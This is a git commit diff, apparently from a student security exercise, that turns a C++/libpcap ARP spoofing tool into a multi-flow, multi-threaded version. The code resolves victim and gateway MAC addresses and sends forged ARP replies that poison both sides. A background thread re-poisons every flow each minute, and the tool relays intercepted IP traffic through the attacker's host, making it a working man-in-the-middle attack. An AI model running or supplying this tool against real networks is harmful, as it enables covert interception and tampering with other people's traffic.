e0973fa4c9d06dc68ae359c7f45f3e0b2becc335
Judol <wskje0106@ewha.ac.kr>
2025-08-09 15:06:40 -0400

    add multi-thread

--- Makefile
+++ Makefile
@@ -1,12 +1,15 @@
+CXXFLAGS := -Wall -O2 -pthread
+LDFLAGS := -pthread
 LDLIBS += -lpcap
+
 
 all: arp-spoofing
 
-report-send-arp: arp-spoofing.o
-	g++ -o arp-spoofing arp-spoofing.o -lpcap
+arp-spoofing: arp-spoofing.o
+	g++ $(CXXFLAGS) $(LDFLAGS) -o arp-spoofing arp-spoofing.o -lpcap
 
-report-send-arp.o: arp_hdr.h eth_hdr.h arp-spoofing.cpp
-	g++ -c -o arp-spoofing.o arp-spoofing.cpp
+arp-spoofing.o: arp_hdr.h eth_hdr.h arp-spoofing.cpp
+	g++ $(CXXFLAGS) -c -o arp-spoofing.o arp-spoofing.cpp
 
 clean:
 	rm -f arp-spoofing *.o
--- arp-spoofing.cpp
+++ arp-spoofing.cpp
@@ -4,6 +4,8 @@
 #include <string.h>
 #include <string>
 #include <stdlib.h> 
+#include <vector>
+#include <unordered_map>
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
@@ -12,9 +14,15 @@
 #include <ifaddrs.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <thread>
+#include <mutex>
+#include <atomic>
+#include <chrono>
 #include "eth_hdr.h"
 #include "arp_hdr.h"
 #include "ip_hdr.h"
+
+std::mutex g_send_mtx;
 
 struct EthArpPacket {
 	eth_hdr eth;
@@ -24,6 +32,15 @@ struct EthArpPacket {
 struct EthIpPacket {
 	eth_hdr eth;
 	ip_hdr ip;
+};
+
+struct Flow {
+    uint8_t vip[4];   // victim(sender) IP
+    uint8_t tip[4];   // target(gateway) IP
+    uint8_t vmac[6];  // victim MAC
+    uint8_t tmac[6];  // target MAC
+    EthArpPacket attackSender; // poison victim:  gateway IP -> mymac
+    EthArpPacket attackTarget; // poison target:  victim  IP -> mymac
 };
 
 uint8_t* split(uint8_t* tip, char argv[])
@@ -122,21 +139,63 @@ EthArpPacket makeArpPacket(uint16_t oper, u_char *smac, u_char *dmac, u_char *ar
 
 void sendArp(pcap_t* pcap, const EthArpPacket packet)
 {
-	printf("sent an ARP packet\n");
-	
-	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-	}
+    std::lock_guard<std::mutex> lk(g_send_mtx);
+    printf("sent an ARP packet\n");
+    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+    }
 }
 
 void sendPacket(pcap_t* pcap, const u_char *packet, size_t size)
 {
-	int res = pcap_sendpacket(pcap, packet, size);
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-	}
+    std::lock_guard<std::mutex> lk(g_send_mtx);
+    int res = pcap_sendpacket(pcap, packet, size);
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+    }
+}
 
+void SendIpRelayPacket(pcap_t* pcap, const u_char *spoofed_data, const EthIpPacket* spoofed_packet, uint8_t mymac[], const uint8_t vmac[], const uint8_t tmac[], size_t eth_len, size_t total_len)
+{
+			EthIpPacket relay_header = *spoofed_packet;
+			bool SenderToTarget = true;
+			bool TargetToSender = true;
+	
+			for(int i=0; i<6; i++)
+			{
+				if(spoofed_packet->eth.smac[i] != vmac[i]) SenderToTarget = false;
+				if(spoofed_packet->eth.smac[i] != tmac[i]) TargetToSender = false;
+			}
+
+			if(SenderToTarget) 
+			{
+				for(int i=0; i<6; i++)
+				{
+					relay_header.eth.dmac[i] = tmac[i];
+					relay_header.eth.smac[i] = mymac[i];
+				}
+				u_char *relay_packet = (u_char*)malloc(total_len);
+				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
+				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
+				sendPacket(pcap, relay_packet, total_len);
+				free(relay_packet);
+			}
+			else if(TargetToSender)
+			{
+				for(int i=0; i<6; i++)
+				{
+					relay_header.eth.dmac[i] = vmac[i];
+					relay_header.eth.smac[i] = mymac[i];
+					}
+
+				u_char *relay_packet = (u_char*)malloc(total_len);
+				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
+				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
+				sendPacket(pcap, relay_packet, total_len);
+				free(relay_packet);
+			}
+			
 }
 
 void getArp(pcap_t* pcap, pcap_pkthdr **header, const u_char **data)
@@ -187,12 +246,27 @@ void getMac(pcap_t* pcap, pcap_t* res_pcap, const EthArpPacket packet, uint8_t *
 		}
 }
 
+void periodic_arp(std::atomic<bool>& running,
+                  pcap_t* pcap,
+                  const std::vector<Flow>& flows)
+{
+    using namespace std::chrono;
+    while (running.load(std::memory_order_relaxed)) {
+        for (const auto& f : flows) {
+            sendArp(pcap, f.attackSender);
+            sendArp(pcap, f.attackTarget);
+        }
+        printf("[periodic] re-poisoned %zu flows\n", flows.size());
+        std::this_thread::sleep_for(minutes(1));
+    }
+}
+
+
 int main(int argc, char* argv[]) 
 {
 
-	if (argc < 3 || argc%2 != 0) 
-	{
-    fprintf(stderr, "Usage: %s <interface> <sender-ip> <target-ip>\n", argv[0]);
+if (argc < 4 || ((argc - 2) % 2) != 0) {
+    fprintf(stderr, "Usage: %s <interface> <sender-ip1> <target-ip1> [<sender-ip2> <target-ip2> ...]\n", argv[0]);
     return EXIT_FAILURE;
 }
 
@@ -211,90 +285,85 @@ int main(int argc, char* argv[])
 		return EXIT_FAILURE;
 	}
 
+	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+	u_char zero[] = {0,0,0,0,0,0};
+
+	std::vector<Flow> flows;
+	flows.reserve((argc - 2)/2);
+
+	for (int i = 2; i < argc; i += 2) {
+    Flow f{};
+    uint8_t vip_arr[4], tip_arr[4];
+    split(vip_arr, argv[i]);  
+    split(tip_arr, argv[i+1]); 
+    memcpy(f.vip, vip_arr, 4);
+    memcpy(f.tip, tip_arr, 4);
+
+    const EthArpPacket SenderPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, f.vip);
+    const EthArpPacket TargetPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, f.tip);
+    getMac(pcap, res_pcap, SenderPacket, f.vmac, myip, f.vip);
+    getMac(pcap, res_pcap, TargetPacket, f.tmac, myip, f.tip);
+
+    f.attackSender = makeArpPacket(0x0002, mymac, f.vmac, mymac, f.vmac, f.tip, f.vip);
+    f.attackTarget = makeArpPacket(0x0002, mymac, f.tmac, mymac, f.tmac, f.vip, f.tip);
+
+    sendArp(pcap, f.attackSender);
+    sendArp(pcap, f.attackTarget);
+
+    flows.push_back(f);
+    printf("[init] flow %d ready: victim=%s, target=%s\n", (i-2)/2 + 1, argv[i], argv[i+1]);
+}
+
 	// int cnt = (argc -2) / 2;
 	// int i = 2;
 	// while(cnt--)
 	// {
 	// get sender's MAC
-	uint8_t vip_arr[4];
-	uint8_t *vip = split(vip_arr, argv[2]);
-	uint8_t tip_arr[4];
-	uint8_t *tip = split(tip_arr, argv[3]);
-	u_char ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-	u_char zero[] = {0,0,0,0,0,0};
-	uint8_t vmac[6];
-	uint8_t tmac[6];
 
-	const EthArpPacket SenderPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, vip);
-	const EthArpPacket TargetPacket = makeArpPacket(0x0001, mymac, ff, mymac, zero, myip, tip);
+		printf("Attacked %zu flows\n", flows.size());
 
-	getMac(pcap, res_pcap, SenderPacket, vmac, myip, vip);
-	getMac(pcap, res_pcap, TargetPacket, tmac, myip, tip);
-	
-		// attack
-		const EthArpPacket attackSenderPacket = makeArpPacket(0x0002, mymac, vmac, mymac, vmac, tip, vip);
-		const EthArpPacket attackTargetPacket = makeArpPacket(0x0002, mymac, tmac, mymac, tmac, vip, tip);
-		
-		sendArp(pcap, attackSenderPacket);
-		sendArp(pcap, attackTargetPacket);
-		printf("Attacked\n");
+		static std::atomic<bool> keep_running(true);
+		std::thread keep_poison(periodic_arp, std::ref(keep_running), pcap, std::cref(flows));
+		keep_poison.detach();
 
-		// relay spoofed packet
+		// listen
 		while(true)
 		{
 			struct pcap_pkthdr *spoofed_header;
 			const u_char *spoofed_data;
 			getPacket(res_pcap, &spoofed_header, &spoofed_data);
-			const EthIpPacket* spoofed_packet = reinterpret_cast<const EthIpPacket*>(spoofed_data);
-			size_t eth_len = sizeof(eth_hdr);
-			size_t ip_len = (spoofed_packet->ip.ver_ihl & 0x0F) * 4; 
-			size_t header_len = eth_len + ip_len;
-			size_t total_len = spoofed_header->caplen;
-			const u_char *payload = spoofed_data + header_len;
-			size_t paylod_len = total_len - header_len;
-			
-			
-			if(ntohs(spoofed_packet->eth.ethType) == 0x0800){
-			EthIpPacket relay_header = *spoofed_packet;
-			bool SenderToTarget = true;
-			bool TargetToSender = true;
-	
-			for(int i=0; i<6; i++)
-			{
-				if(spoofed_packet->eth.smac[i] != vmac[i]) SenderToTarget = false;
-				if(spoofed_packet->eth.smac[i] != tmac[i]) TargetToSender = false;
-			}
 
-			if(SenderToTarget) 
-			{
-				for(int i=0; i<6; i++)
-				{
-					relay_header.eth.dmac[i] = tmac[i];
-					relay_header.eth.smac[i] = mymac[i];
-				}
-				printf("\n");
-				u_char *relay_packet = (u_char*)malloc(total_len);
-				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
-				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
-				sendPacket(pcap, relay_packet, total_len);
-				free(relay_packet);
+			const EthIpPacket* spoofed_packet = reinterpret_cast<const EthIpPacket*>(spoofed_data);
+			if (spoofed_header->caplen < sizeof(eth_hdr)) continue;
+			size_t eth_len = sizeof(eth_hdr);
+			size_t total_len = spoofed_header->caplen;
+
+			const Flow* hit = nullptr;
+   			bool fromSender = false;
+    		bool fromTarget = false;
+
+			for (const auto& f : flows) {	
+			if (memcmp(spoofed_packet->eth.smac, f.vmac, 6) == 0) {
+				hit = &f; 
+				fromSender = true; 
+				break;
 			}
-			else if(TargetToSender)
-			{
-				for(int i=0; i<6; i++)
-				{
-					relay_header.eth.dmac[i] = vmac[i];
-					relay_header.eth.smac[i] = mymac[i];
-					}
-					printf("\n");
-				u_char *relay_packet = (u_char*)malloc(total_len);
-				memcpy(relay_packet, &relay_header.eth, sizeof(eth_hdr));
-				memcpy(relay_packet + eth_len, spoofed_data + eth_len, total_len - eth_len);
-				sendPacket(pcap, relay_packet, total_len);
-				free(relay_packet);
+			if (memcmp(spoofed_packet->eth.smac, f.tmac, 6) == 0) {
+				hit = &f; 
+				fromTarget = true; 
+				break;
 			}
-			
 		}
+			if (!hit) continue; 
+			
+			if(ntohs(spoofed_packet->eth.ethType) == 0x0800)		
+				SendIpRelayPacket(pcap, spoofed_data, spoofed_packet, mymac, hit->vmac, hit->tmac, eth_len, total_len);
+
+			if(ntohs(spoofed_packet->eth.ethType) == 0x0806)
+				{
+					if(fromSender) sendArp(pcap, hit->attackSender);
+					if(fromTarget) sendArp(pcap, hit->attackTarget);
+				}
 			
 		}
 
